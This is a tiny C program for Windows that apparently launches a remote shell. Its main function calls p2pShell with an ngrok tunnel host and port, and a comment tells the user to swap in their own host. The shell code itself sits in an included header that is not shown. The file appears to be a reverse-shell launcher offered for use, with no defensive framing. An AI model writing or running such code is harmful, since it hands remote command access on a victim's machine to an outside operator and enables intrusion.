#include "network.h"
int main() {
    // remember to compile with -lws2_32 
    // example, change this to your host/port
    p2pShell("2.tcp.ngrok.io", 14723);
}
